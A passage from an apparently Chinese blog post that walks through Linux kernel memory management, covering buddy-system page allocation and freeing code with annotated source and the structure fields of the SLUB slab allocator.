&amp;(zone-&gt;free_area[current_order]);</span><br><span class="line">page = get_page_from_free_area(area, migratetype);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line">            <span class="comment">// 如果当前 order 的页面为空，则选更高 order 的页面</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// 脱链</span></span><br><span class="line">del_page_from_free_list(page, zone, current_order);</span><br><span class="line">        <span class="comment">// 在 expand 中进行拆分和上链</span></span><br><span class="line">expand(zone, page, order, current_order, migratetype);</span><br><span class="line">    <span class="comment">// 设置页的迁移类型</span></span><br><span class="line">set_pcppage_migratetype(page, migratetype);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">expand</span><span class="params">(<span class="keyword">struct</span> zone *zone, <span class="keyword">struct</span> page *page,</span></span><br><span class="line"><span class="params">    <span class="type">int</span> low, <span class="type">int</span> high, <span class="type">int</span> migratetype)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size = <span class="number">1</span> &lt;&lt; high;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从当前 order 循环到需要分配的 order</span></span><br><span class="line">    <span class="keyword">while</span> (high &gt; low) &#123;</span><br><span class="line">        high--;</span><br><span class="line">        size &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 可能将后半页面标记作为守护页，在前半页被释放后，会进行合并</span></span><br><span class="line"><span class="comment">         * 对应的页表项也不会被创建，这部分也不会出现在虚拟地址空间中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (set_page_guard(zone, &amp;page[size], high, migratetype))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将后半页面添加到对应大小和迁移类型的链表中</span></span><br><span class="line">        add_to_free_list(&amp;page[size], zone, high, migratetype);</span><br><span class="line">        <span class="comment">// 设置后半页面的 order</span></span><br><span class="line">        set_buddy_order(&amp;page[size], high);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>从 zone 取出大小合适的页面，如果当前 order 的页面为空，那么从更高 order 的链表中去取</li><li>将页面脱链</li><li>调用 <code>expand</code> 函数将页面进行拆分和上链<ol><li>从当前 order 循环到需要分配的 order</li><li>后半页面添加到对应大小的链表中</li><li>设置前半页面的 order，下一步继续拆分，直到 order 刚好合适</li></ol></li><li>设置页面的迁移类型，返回页面</li></ol><h6 id="rmqueue-函数-1"><a href="#rmqueue-函数-1" class="headerlink" title="__rmqueue 函数"></a><code>__rmqueue</code> 函数</h6><figure class="highlight c"><figcaption><span>mm/page_alloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">rmqueue</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class">                        <span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;</span><br><span class="line">            zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;</span><br><span class="line">            zone_page_state(zone, NR_FREE_PAGES) / <span class="number">2</span>) &#123;</span><br><span class="line">            page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line">            <span class="keyword">if</span> (page)</span><br><span class="line">                <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">retry:</span><br><span class="line">    page = __rmqueue_smallest(zone, order, migratetype);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA)</span><br><span class="line">            page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 __rmqueue_fallback 看其他迁移类型有没有可以用的页面偷过来</span></span><br><span class="line">        <span class="keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,</span><br><span class="line">                                alloc_flags))</span><br><span class="line">            <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">if</span> (page)</span><br><span class="line">        trace_mm_page_alloc_zone_locked(page, order, migratetype);</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>如果开启了 CMA，从 CMA 区域获取页面（不细讲）</li><li>调用 <code>__rmqueue_smallest</code> 从 zone 对应迁移类型的链表中取页面</li><li>如果失败了，从 CMA 区域获取页面</li><li>如果还是失败了，调用 <code>__rmqueue_fallback</code> 从 zone 其他迁移类型的链表中寻找可用的页面放到当前迁移类型的链表中，重试步骤 2</li><li>如果还没有就寄</li></ol><h5 id="慢速分配：-alloc-pages-slowpath-函数"><a href="#慢速分配：-alloc-pages-slowpath-函数" class="headerlink" title="慢速分配：__alloc_pages_slowpath 函数"></a>慢速分配：<code>__alloc_pages_slowpath</code> 函数</h5><p>快速分配不成功说明系统可能没有足够的连续空闲页面，接下来进入慢速分配，先进行内存碎片整理与内存回收，再进行分配</p><p>#todo</p><h4 id="上层-API-函数"><a href="#上层-API-函数" class="headerlink" title="上层 API 函数"></a>上层 API 函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__alloc_pages_node <span class="comment">/*返回 struct page 的指针*/</span></span><br><span class="line">    __alloc_pages</span><br><span class="line">        __alloc_pages_nodemask</span><br><span class="line"></span><br><span class="line">alloc_pages        <span class="comment">/*返回 struct page 的指针*/</span></span><br><span class="line">    alloc_pages_current</span><br><span class="line">        __alloc_pages_nodemask  </span><br><span class="line"></span><br><span class="line">__get_free_pages   <span class="comment">/*返回页面的虚拟地址*/</span></span><br><span class="line">    alloc_pages</span><br><span class="line">        alloc_pages_current</span><br><span class="line">            __alloc_pages_nodemask</span><br></pre></td></tr></table></figure><h3 id="页面释放"><a href="#页面释放" class="headerlink" title="页面释放"></a>页面释放</h3><p>Buddy System 的 buddy 其实就在于页面释放时，寻找与被释放的页面<strong>内存对齐</strong>的页面（可能与上一页面，也可能是下一页面）作为 buddy，检查该 buddy 是否可以合并</p><p>buddy 实际上就是指守护页或空闲页面</p><p><code>__free_one_page</code> 是页面释放的核心函数，这里的 page 是指页面，而不是页</p><p>函数定义于 <code>mm/page_alloc.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __free_one_page(<span class="keyword">struct</span> page *page,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> pfn,</span><br><span class="line">        <span class="keyword">struct</span> zone *zone, <span class="type">unsigned</span> <span class="type">int</span> order,</span><br><span class="line">        <span class="type">int</span> migratetype, <span class="type">fpi_t</span> fpi_flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">capture_control</span> *<span class="title">capc</span> =</span> task_capc(zone);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> buddy_pfn;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> combined_pfn;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> max_order;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">buddy</span>;</span></span><br><span class="line">    <span class="type">bool</span> to_tail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算最高 order</span></span><br><span class="line">    max_order = <span class="type">min_t</span>(<span class="type">unsigned</span> <span class="type">int</span>, MAX_ORDER - <span class="number">1</span>, pageblock_order);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查参数的合法性</span></span><br><span class="line">    VM_BUG_ON(!zone_is_initialized(zone));</span><br><span class="line">    VM_BUG_ON_PAGE(page-&gt;flags &amp; PAGE_FLAGS_CHECK_AT_PREP, page);</span><br><span class="line"></span><br><span class="line">    VM_BUG_ON(migratetype == <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (likely(!is_migrate_isolate(migratetype)))</span><br><span class="line">        __mod_zone_freepage_state(zone, <span class="number">1</span> &lt;&lt; order, migratetype);</span><br><span class="line"></span><br><span class="line">    VM_BUG_ON_PAGE(pfn &amp; ((<span class="number">1</span> &lt;&lt; order) - <span class="number">1</span>), page);</span><br><span class="line">    VM_BUG_ON_PAGE(bad_range(zone, page), page);</span><br><span class="line"></span><br><span class="line">continue_merging:</span><br><span class="line">    <span class="comment">// 只要还能合并，order 没到最高 order，就继续合并</span></span><br><span class="line">    <span class="keyword">while</span> (order &lt; max_order) &#123;</span><br><span class="line">        <span class="keyword">if</span> (compaction_capture(capc, page, order, migratetype)) &#123;</span><br><span class="line">            __mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">                                migratetype);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 计算 buddy 的 PFN</span></span><br><span class="line">        buddy_pfn = __find_buddy_pfn(pfn, order);</span><br><span class="line">        buddy = page + (buddy_pfn - pfn);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!pfn_valid_within(buddy_pfn))</span><br><span class="line">            <span class="keyword">goto</span> done_merging;</span><br><span class="line">        <span class="comment">// 检查 buddy 是否能合并，比如是否被释放，是否同阶，是否在同一 zone</span></span><br><span class="line">        <span class="keyword">if</span> (!page_is_buddy(page, buddy, order))</span><br><span class="line">            <span class="keyword">goto</span> done_merging;</span><br><span class="line">        <span class="keyword">if</span> (page_is_guard(buddy))</span><br><span class="line">            <span class="comment">// 若 buddy 是守护页，则去除守护页标志</span></span><br><span class="line">            clear_page_guard(zone, buddy, order, migratetype);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">// 否则将 buddy 脱链，以便合并</span></span><br><span class="line">            del_page_from_free_list(buddy, zone, order);</span><br><span class="line">        <span class="comment">// 计算合并后的 page 属性</span></span><br><span class="line">        combined_pfn = buddy_pfn &amp; pfn;</span><br><span class="line">        page = page + (combined_pfn - pfn);</span><br><span class="line">        pfn = combined_pfn;</span><br><span class="line">        order++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (order &lt; MAX_ORDER - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果到了这里，说明 order &gt;= pageblock_order</span></span><br><span class="line"><span class="comment">         * 希望阻止隔离 pageblock 上的页面与正常 pageblock 的合并</span></span><br><span class="line"><span class="comment">         * 如果不阻止，可能导致错误的空闲页或 CMA 计数</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(has_isolate_pageblock(zone))) &#123;</span><br><span class="line">            <span class="comment">// 如果有隔离 pageblock，需要停止合并</span></span><br><span class="line">            <span class="type">int</span> buddy_mt;</span><br><span class="line"></span><br><span class="line">            buddy_pfn = __find_buddy_pfn(pfn, order);</span><br><span class="line">            buddy = page + (buddy_pfn - pfn);</span><br><span class="line">            buddy_mt = get_pageblock_migratetype(buddy);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (migratetype != buddy_mt</span><br><span class="line">                    &amp;&amp; (is_migrate_isolate(migratetype) ||</span><br><span class="line">                        is_migrate_isolate(buddy_mt)))</span><br><span class="line">                <span class="keyword">goto</span> done_merging;</span><br><span class="line">        &#125;</span><br><span class="line">        max_order = order + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> continue_merging;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">done_merging:</span><br><span class="line">    <span class="comment">// 合并完成后，设置页面的 order，设置 buddy 标志位</span></span><br><span class="line">    set_buddy_order(page, order);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断插入到链表头还是链表尾，通常是链表头，遵循 LIFO</span></span><br><span class="line">    <span class="keyword">if</span> (fpi_flags &amp; FPI_TO_TAIL)</span><br><span class="line">        to_tail = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (is_shuffle_order(order))</span><br><span class="line">        to_tail = shuffle_pick_tail();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="comment">// 如果该页面很大或下一个页面也是空闲的，则插入到链表尾</span></span><br><span class="line">        to_tail = buddy_merge_likely(pfn, buddy_pfn, page, order);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (to_tail)</span><br><span class="line">        add_to_free_list_tail(page, zone, order, migratetype);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        add_to_free_list(page, zone, order, migratetype);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(fpi_flags &amp; FPI_SKIP_REPORT_NOTIFY))</span><br><span class="line">        page_reporting_notify_free(order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>计算 max_order 和 buddy 的 PFN</li><li>通过 <code>page_is_buddy</code> 检查 buddy 是否可以合并<ul><li>该 buddy 是否设置 buddy 标志位或是守卫页</li><li>是否同 order</li><li>是否在同一 zone</li></ul></li><li>如果可以合并，取消 buddy 标志位并脱链，或取消守卫页标志位</li><li>计算合并后的页面属性，跳转到步骤 1，继续合并，直到到达 max_order 或 buddy 不能合并</li><li>判断是否有隔离 pageblock（pageblock 是一种比较大的页面，order &gt;= MAX_ORDER-1）<ul><li>如果有则停止合并</li><li>如果没有，则跳转到步骤 1 尝试继续合并</li></ul></li><li>合并完成，设置页面 order 和 buddy 标志位（表示页面为空闲页面）</li><li>判断插入到空间页面的链表头还是链表尾，通常是链表头，遵循 LIFO</li></ol><h4 id="上层-API-函数-1"><a href="#上层-API-函数-1" class="headerlink" title="上层 API 函数"></a>上层 API 函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">free_pages</span><br><span class="line">    __free_pages</span><br><span class="line">        free_the_page</span><br><span class="line">            free_unref_page or __free_pages_ok</span><br><span class="line">                free_one_page</span><br><span class="line">                    __free_one_page</span><br></pre></td></tr></table></figure><h2 id="Slab"><a href="#Slab" class="headerlink" title="Slab"></a>Slab</h2><p>Buddy System 分配的页面单位是页，而往往使用的时候并不需要那么大的空间，因此需要更细粒度的内存分配器对从 Buddy System 获取的页面进行管理，也就是 Slab Allocator，它会将页面分割成小的对象（object）供其他组件使用</p><p>Slab 又被称为内核的堆管理器，动态分配内存</p><ul><li>Slab 经历了三个版本<ul><li>Slab：最初版本，机制复杂，效率不高</li><li>Slob：用于嵌入式等的简化版本</li><li>Slub：优化后的通用版本</li></ul></li></ul><p>本文主要介绍 Slub，Linux 最常用的内存分配器</p><p>下图是 Slub 的结构概览</p><p><img src="/img/Linux_Kernel_%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.assets/Slub.png" alt="Slub"></p><h3 id="基本结构体"><a href="#基本结构体" class="headerlink" title="基本结构体"></a>基本结构体</h3><h4 id="slab"><a href="#slab" class="headerlink" title="slab"></a><code>slab</code></h4><p>Slub 将从 Buddy System 获取的页面称为一张 slab，对应的匿名结构体内嵌在 <code>page</code> 结构体中，新版本的 Slub 是单独拿出一个 <code>slab</code> 结构体，本质上也是复用 <code>page</code> 结构体</p><p>定义位于 <code>include/linux/mm_types.h</code></p><p>下面介绍与 slab 有关的几个重要字段</p><h5 id="slab-list"><a href="#slab-list" class="headerlink" title="slab_list"></a><code>slab_list</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br></pre></td></tr></table></figure><p>按用途连接多个 slab 的双向链表</p><h5 id="Partial-pages"><a href="#Partial-pages" class="headerlink" title="Partial pages"></a>Partial pages</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">    <span class="type">int</span> pages;</span><br><span class="line">    <span class="type">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">short</span> <span class="type">int</span> pages;</span><br><span class="line">    <span class="type">short</span> <span class="type">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当 slab 位于 <code>kmem_cache_cpu</code> 和 <code>kmem_cache_node</code> 的 <code>partial</code> 链表上会使用</p><ul><li><code>next</code>：指向链表上的下一张 slab</li><li><code>pages</code>：<code>partial</code> 链表后面的剩余页面的数量（包括自己）</li><li><code>pobject</code>：该 slab 上剩余空闲对象的大约数量</li></ul><h5 id="slab-cache"><a href="#slab-cache" class="headerlink" title="slab_cache"></a><code>slab_cache</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br></pre></td></tr></table></figure><p>该 slab 的管理器，后面会详细介绍</p><h5 id="freelist"><a href="#freelist" class="headerlink" title="freelist"></a><code>freelist</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *freelist;</span><br></pre></td></tr></table></figure><p>该 slab 的空闲对象单向链表，指向第一个空闲对象</p><h5 id="counters"><a href="#counters" class="headerlink" title="counters"></a><code>counters</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">        <span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">        <span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>inuse</code>：已被使用的对象数量，包括 <code>kmem_cache_cpu-&gt;freelist</code> 上的空闲对象</li><li><code>objects</code>：对象总数</li><li><code>frozen</code>：是否归属于特定 CPU，cpu slab 和 cpu partial slab 都为 1</li></ul><p><code>couters</code> 和上面三个字段属于同一内存，后面有大量对 <code>couters</code> 的赋值操作，实际上是对 <code>inuse</code> &amp; <code>objects</code> &amp; <code>frozen</code> 的赋值</p><h5 id="slab-分类"><a href="#slab-分类" class="headerlink" title="slab 分类"></a>slab 分类</h5><ul><li>cpu slab：位于 <code>kmem_cache_cpu-&gt;page</code> 上，<code>frozen</code> 为 1</li><li>cpu partial slab：位于 <code>kmem_cache_cpu-&gt;partial</code> 链表上，<code>frozen</code> 为 1</li><li>node slab：位于 <code>kmem_cache_node-&gt;partial</code> 双向链表上</li><li>full slab：没有空闲对象的 slab，如果开启 <code>CONFIG_SLUB_DEBUG</code> 配置，位于 <code>kmem_cache_node-&gt;full</code> 双向链表上</li><li>empty slab：没有正在使用的对象的 slab</li></ul><h4 id="object"><a href="#object" class="headerlink" title="object"></a>object</h4><p>slab 中的内存最小单元，对象</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">object</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> data[];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">object</span> *<span class="title">next_free_object</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>object 不像在 glibc 中的 chunk 有明确的结构体定义，上面的定义为笔者自己捏造的（不信就算了）</p><ul><li><code>data</code>：用于存放数据，一个 slab 上的大小相同，不同 slab 的大小可能不同</li><li><code>next_free_object</code>：单向链表，指向下一个空闲对象</li></ul><h4 id="kmem-cache"><a href="#kmem-cache" class="headerlink" title="kmem_cache"></a><code>kmem_cache</code></h4><p>用于分配特定大小或用途的对象的管理器，每个 <code>kmem_cache</code> 有若干张 slab</p><p>所有的 <code>kmem_cache</code> 存储在一个通用 <code>kmalloc_caches</code> 数组中，并构成一个双向链表</p><figure class="highlight c"><figcaption><span>mm/slab_common.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *</span></span><br><span class="line"><span class="class"><span class="title">kmalloc_caches</span>[<span class="title">NR_KMALLOC_TYPES</span>][<span class="title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="title">ro_after_init</span> =</span></span><br><span class="line">&#123; <span class="comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;</span><br><span class="line">EXPORT_SYMBOL(kmalloc_caches);</span><br></pre></td></tr></table></figure><p><code>kmem_cache</code> 结构体定义位于 <code>include/linux/slub_def.h</code></p><p>下面介绍几个重要字段</p><h5 id="cpu-slab"><a href="#cpu-slab" class="headerlink" title="cpu_slab"></a><code>cpu_slab</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br></pre></td></tr></table></figure><p>percpu 变量，每个 CPU 独有一个，相当于每个 CPU 的内存池</p><h5 id="flags-1"><a href="#flags-1" class="headerlink" title="flags"></a><code>flags</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">slab_flags_t</span> flags;</span><br></pre></td></tr></table></figure><p>标志位，用于回收等</p><h5 id="min-partial"><a href="#min-partial" class="headerlink" title="min_partial"></a><code>min_partial</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br></pre></td></tr></table></figure><p>node partial 链表上 slab 的最小可释放数量，用于判断全是空闲对象的 slab 是放到 node slab 上还是释放给 buddy system（node slab 足够多）</p><h5 id="size-amp-object-size"><a href="#size-amp-object-size" class="headerlink" title="size &amp; object_size"></a><code>size</code> &amp; <code>object_size</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> object_size;</span><br></pre></td></tr></table></figure><ul><li>size：对象的实际大小</li><li>object_size：对象所能存放的数据大小</li></ul><h5 id="offset"><a href="#offset" class="headerlink" title="offset"></a><code>offset</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset;</span><br></pre></td></tr></table></figure><p>slab 上 <code>next_free_object</code> 在对象上的偏移，用于获取下一个空闲对象，不同 slab 可能不同</p><h5 id="cpu-partial"><a href="#cpu-partial" class="headerlink" title="cpu_partial"></a><code>cpu_partial</code></h5><p>该 <code>kmem_cache</code> 上 cpu partial slab 上空闲对象的数量限制，用于限制 cpu partial slab 的数量</p><ul><li>当新插入的 slab 上的空闲对象数量超过 <code>cpu_partial</code>，会将其他 cpu partial slab 放入 node slab</li><li>当 cpu slab 上的空闲对象数量超过 <code>cpu_partial</code> 的一半，不会添加 cpu partial slab</li></ul><h5 id="oo"><a href="#oo" class="headerlink" title="oo"></a><code>oo</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>低 16 位：一张 slab 上的对象数量</li><li>高 16 位：一张 slab 的大小（order）</li></ul><h5 id="min"><a href="#min" class="headerlink" title="min"></a><code>min</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br></pre></td></tr></table></figure><p>一张 